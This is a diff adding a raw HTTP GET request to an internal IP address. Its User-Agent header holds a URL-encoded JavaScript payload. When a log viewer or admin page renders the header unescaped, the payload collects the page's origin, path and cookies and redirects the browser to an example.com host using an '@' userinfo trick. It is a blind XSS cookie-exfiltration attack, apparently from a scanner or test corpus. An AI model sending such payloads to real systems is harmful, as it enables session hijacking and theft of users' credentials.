@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: a%3D%5Blocation.origin%2C%20%27%0A%40example%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
